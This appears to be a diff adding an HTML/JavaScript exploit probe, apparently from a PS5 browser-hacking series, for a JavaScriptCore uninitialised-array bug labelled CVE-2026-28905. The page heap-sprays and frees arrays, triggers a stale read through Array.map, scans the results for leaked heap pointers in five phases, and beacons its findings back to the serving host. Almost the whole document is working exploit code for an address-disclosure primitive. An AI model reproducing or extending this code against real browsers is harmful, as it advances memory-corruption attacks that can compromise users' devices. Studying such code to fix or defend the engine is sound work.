@@ -1,0 +1,348 @@
+<!--
+  p664: CVE-2026-28905 — extract raw pointer bits from stale butterfly
+  p663 is not evidence for this CVE: its map callback returned `arr`, so every
+  entry it counted as a "stale value" was the normal callback result. The
+  corrected p663 keeps the callback result undefined and only treats non-
+  undefined slots as stale; this probe assumes the same corrected trigger.
+  
+  STATUS (2026-11-06): dense-source negative control. The callback result is
+  undefined, the result allocation is pre-initialized, and the public PS5
+  port has JIT/DFG/FTL off. Expected: no marker, pointer, or scalar leak.
+  Any hit is an engine/config divergence requiring the sparse-source re-arm,
+  not standalone CVE evidence.
+
+  Strategy:
+  1. Pre-fill butterfly memory with float64 values (which ARE raw bits)
+  2. Free those arrays → butterfly memory freed but contains our doubles
+  3. Trigger opt() → new array gets a butterfly from the freed pool
+  4. Unwritten slots contain our old doubles OR stale JSCell pointers
+  5. Read them as numbers → raw bits → potential pointer leak
+  
+  Key insight: JSC NaN-boxes values. A pointer to a JSObject is stored as:
+    0x0000_PPPP_PPPP_PPPP (48-bit pointer, high bits 0)
+  A double is stored as the IEEE754 bits directly.
+  When we read a stale slot that was a pointer, Number() gives us a double
+  whose bits ARE the pointer value.
+  
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p664</title></head>
+<body>p664: butterfly ptr extract
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=3)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,4).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P664-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+function valInfo(v){
+  var t=typeof v;
+  if(t==='number'){
+    var h=d2hex(v);
+    // Check for pointer-like: non-zero, not standard NaN/Inf, not small int
+    var dominated=h.slice(0,4);
+    var isStdNaN=(h==='7ff8000000000000'||h==='fff8000000000000');
+    var isSpecial=(!isFinite(v)||isStdNaN);
+    return {t:t,h:h,special:isSpecial,dominated:dominated};
+  }
+  return {t:t,h:'N/A',s:String(v).slice(0,30)};
+}
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: Pre-fill butterfly memory with known doubles,
+// free, then trigger the uninit read
+// ================================================================
+emit('A','prefill-doubles');
+try{
+  // Create arrays whose butterfly slots contain recognizable doubles
+  var marker = 1.234567890123e-100; // unique bit pattern
+  var markerHex = d2hex(marker);
+  emit('A-MARKER','hex='+markerHex);
+
+  var fillers=[];
+  for(var i=0;i<2000;i++){
+    var a=[marker,marker,marker,marker,marker,marker,marker];
+    fillers.push(a);
+  }
+  // Free them — butterfly backing store goes back to pool
+  fillers=null;
+
+  // Allocate pressure to avoid GC holding references
+  var junk=[];
+  for(var i=0;i<500;i++) junk.push({x:i});
+  junk=null;
+
+  function optA(){
+    var arr=[0,0,0,0,0,0,0];
+    function f(){arr[0];(0)[0];return undefined;}
+    var ret=arr.map(f);
+    ret[0]=1;
+    return ret;
+  }
+  for(var i=0;i<2000;i++) optA();
+
+  var hitsA=0,samplesA=[];
+  for(var i=0;i<200;i++){
+    var r=optA();
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      if(typeof v==='number' && v!==0 && v!==1){
+        var info=valInfo(v);
+        if(info.h===markerHex) hitsA++;
+        if(samplesA.length<10) samplesA.push({i:i,j:j,h:info.h,v:v});
+      }
+    }
+  }
+  emit('A-RESULT','markerHits='+hitsA+',numSamples='+samplesA.length);
+  for(var k=0;k<samplesA.length;k++)
+    emit('A-SAMPLE','i='+samplesA[k].i+',j='+samplesA[k].j+',hex=0x'+samplesA[k].h);
+  if(hitsA>0) emit('A-VERDICT','MARKER-RECOVERED — butterfly reuse confirmed');
+  else if(samplesA.length>0) emit('A-VERDICT','OTHER-NUMBERS — stale data but not our marker');
+  else emit('A-VERDICT','no-numbers (callback result is undefined)');
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: Use Float64Array view to encode known pointer patterns,
+// store them as array elements, free, trigger uninit read
+// ================================================================
+emit('B','f64-encoded-ptrs');
+try{
+  // Simulate what a JSCell pointer looks like as a double
+  // JSC NaN-boxing on 64-bit: doubles stored as-is, pointers have tag bits
+  // On PS5: heap addresses ~0x00000010_XXXXXXXX (from FontFace T values)
+  // As a double: very small denormalized number
+
+  // Create arrays with elements that look like pointer values when stored
+  var fakePtr=new Float64Array(1);
+  var fakePtrU8=new Uint8Array(fakePtr.buffer);
+  // Simulate 0x00000010008b0100 (a real T value from p649j)
+  fakePtrU8[0]=0x00; fakePtrU8[1]=0x01; fakePtrU8[2]=0x8b;
+  fakePtrU8[3]=0x00; fakePtrU8[4]=0x10; fakePtrU8[5]=0x00;
+  fakePtrU8[6]=0x00; fakePtrU8[7]=0x00;
+  var ptrAsDouble=fakePtr[0];
+  emit('B-SIMPTR','0x'+d2hex(ptrAsDouble)+'='+ptrAsDouble);
+
+  var fillers2=[];
+  for(var i=0;i<2000;i++){
+    fillers2.push([ptrAsDouble,ptrAsDouble,ptrAsDouble,ptrAsDouble,ptrAsDouble,ptrAsDouble,ptrAsDouble]);
+  }
+  fillers2=null;
+  var j2=[];for(var i=0;i<500;i++)j2.push([i]);j2=null;
+
+  function optB(){
+    var arr=[0,0,0,0,0,0,0];
+    function f(){arr[0];(0)[0];return undefined;}
+    var ret=arr.map(f);
+    ret[0]=1;
+    return ret;
+  }
+  for(var i=0;i<2000;i++) optB();
+
+  var hitsB=0,samplesB=[];
+  for(var i=0;i<200;i++){
+    var r=optB();
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      if(typeof v==='number' && v!==0 && v!==1){
+        if(d2hex(v)===d2hex(ptrAsDouble)) hitsB++;
+        if(samplesB.length<10) samplesB.push({i:i,j:j,h:d2hex(v)});
+      }
+    }
+  }
+  emit('B-RESULT','ptrHits='+hitsB+',samples='+samplesB.length);
+  for(var k=0;k<samplesB.length;k++)
+    emit('B-SAMPLE','hex=0x'+samplesB[k].h);
+  if(hitsB>0) emit('B-VERDICT','FAKE-PTR-RECOVERED');
+  else emit('B-VERDICT','no-ptr-recovery');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Direct object address leak attempt
+// Store diverse objects, free, try to read their JSCell addresses
+// from the stale butterfly slots as doubles
+// ================================================================
+emit('C','direct-addr-leak');
+try{
+  // Create objects with different structures to get diverse JSCell addresses
+  var targets=[];
+  for(var i=0;i<500;i++){
+    targets.push({['prop'+i]:i, val:Math.random()});
+  }
+
+  // Create arrays that reference these objects in their butterfly
+  var refs=[];
+  for(var i=0;i<1000;i++){
+    refs.push([targets[i%500],targets[(i+1)%500],targets[(i+2)%500],
+               targets[(i+3)%500],targets[(i+4)%500],targets[(i+5)%500],
+               targets[(i+6)%500]]);
+  }
+  // Free the reference arrays (but keep targets alive)
+  refs=null;
+  var j3=[];for(var i=0;i<300;i++)j3.push({z:i});j3=null;
+
+  function optC(){
+    var arr=[0,0,0,0,0,0,0];
+    function f(){arr[0];(0)[0];return undefined;}
+    var ret=arr.map(f);
+    ret[0]=1;
+    return ret;
+  }
+  for(var i=0;i<2000;i++) optC();
+
+  var leaksC=[],numsC=[];
+  for(var i=0;i<300;i++){
+    var r=optC();
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      if(v===0||v===1||v===undefined) continue;
+      if(typeof v==='number'){
+        var h=d2hex(v);
+        if(h!=='7ff8000000000000'&&h!=='0000000000000000'){
+          numsC.push({i:i,j:j,h:h,v:v});
+        }
+      } else if(typeof v==='object'&&v!==null){
+        // Check if it's one of our target objects or the arr itself
+        var isTarget=false;
+        for(var ti=0;ti<10;ti++){
+          if(v===targets[ti]){isTarget=true;break;}
+        }
+        var isArr=(Array.isArray(v)&&v.length===7);
+        leaksC.push({i:i,j:j,isTarget:isTarget,isArr:isArr,type:typeof v});
+      }
+    }
+  }
+
+  emit('C-NUMS','count='+numsC.length);
+  for(var k=0;k<Math.min(numsC.length,10);k++)
+    emit('C-NUM','hex=0x'+numsC[k].h+',val='+numsC[k].v);
+
+  emit('C-OBJS','count='+leaksC.length+',targets='+leaksC.filter(function(x){return x.isTarget;}).length+',arrs='+leaksC.filter(function(x){return x.isArr;}).length);
+
+  if(numsC.length>0){
+    // Check if any look like heap pointers (PS5 WebProcess heap: 0x000000100XXXXXXX)
+    var ptrLike=numsC.filter(function(x){
+      return x.h.slice(0,6)==='000000'&&x.h.slice(6,8)!=='00';
+    });
+    emit('C-PTRLIKE','count='+ptrLike.length);
+    for(var k=0;k<Math.min(ptrLike.length,5);k++)
+      emit('C-PTR','0x'+ptrLike[k].h);
+    if(ptrLike.length>0) emit('C-VERDICT','HEAP-PTR-LEAK — address disclosed!');
+    else emit('C-VERDICT','numbers-but-no-ptrs');
+  } else {
+    emit('C-VERDICT','no-numeric-leak (callback result undefined)');
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: BigUint64Array approach — if we can get the stale slot
+// into a BigUint64Array, we bypass NaN-boxing interpretation
+// ================================================================
+emit('D','bigint-extract');
+try{
+  function optD(){
+    var arr=[0,0,0,0,0,0,0];
+    function f(){arr[0];(0)[0];return undefined;}
+    var ret=arr.map(f);
+    ret[0]=1;
+    return ret;
+  }
+  for(var i=0;i<2000;i++) optD();
+
+  // Get a stale-value array
+  var stale=optD();
+  // Try to observe raw bits via various methods
+  var methods=[];
+
+  // Method 1: typeof + valueOf
+  for(var j=1;j<stale.length;j++){
+    var v=stale[j];
+    if(v===0||v===1||v===undefined) continue;
+    var t=typeof v;
+    methods.push({j:j,typeof:t});
+    if(t==='object'&&v!==null){
+      // Try to extract address via structured clone into ArrayBuffer
+      try{
+        var ab=new ArrayBuffer(8);
+        var dv=new DataView(ab);
+        // Store the object reference somehow...
+        // This won't work directly but let's see what structuredClone does
+        var cloned=structuredClone([v]);
+        methods.push({j:j,cloned:typeof cloned[0]});
+      }catch(e){
+        methods.push({j:j,cloneErr:e.name});
+      }
+    }
+    if(methods.length>=8) break;
+  }
+  emit('D-METHODS',JSON.stringify(methods).slice(0,200));
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: Vary array literal type to get double-typed butterfly
+// JSC uses different butterfly storage for double[] vs object[]
+// If we can get a contiguous double butterfly, stale reads give raw bits
+// ================================================================
+emit('E','double-butterfly');
+try{
+  var leaksE=[];
+
+  // Use ONLY doubles in the literal — JSC should use CopyOnWriteArrayWithDouble
+  function optE(){
+    var arr=[1.1,2.2,3.3,4.4,5.5,6.6,7.7];
+    function f(){arr[0];(0)[0];return undefined;}
+    var ret=arr.map(f);
+    ret[0]=99.99;
+    return ret;
+  }
+  for(var i=0;i<3000;i++) optE();
+
+  for(var i=0;i<300;i++){
+    var r=optE();
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      // Expected values: 99.99 at [0], 1.1-7.7 at [1-6], or stale data
+      if(typeof v==='number'){
+        var expected=[99.99,1.1,2.2,3.3,4.4,5.5,6.6,7.7];
+        if(v!==expected[j]&&v!==0&&v!==undefined){
+          leaksE.push({i:i,j:j,h:d2hex(v),v:v});
+        }
+      } else if(v!==undefined){
+        leaksE.push({i:i,j:j,type:typeof v,h:'N/A'});
+      }
+    }
+  }
+
+  emit('E-RESULT','unexpected='+leaksE.length);
+  for(var k=0;k<Math.min(leaksE.length,10);k++){
+    var lv=leaksE[k];
+    emit('E-LEAK','i='+lv.i+',j='+lv.j+','+(lv.h!=='N/A'?'hex=0x'+lv.h:'type='+lv.type));
+  }
+
+  if(leaksE.length>0){
+    var ptrLike=leaksE.filter(function(x){
+      return x.h&&x.h!=='N/A'&&x.h.slice(0,6)==='000000'&&x.h.slice(6,8)!=='00';
+    });
+    if(ptrLike.length>0) emit('E-VERDICT','PTR-IN-DOUBLE-BUTTERFLY — '+ptrLike.length);
+    else emit('E-VERDICT','stale-data-in-double-butterfly');
+  } else {
+    emit('E-VERDICT','no-unexpected-values');
+  }
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p664-complete');
+flush();
+})();
+</script>
+</body>
+</html>
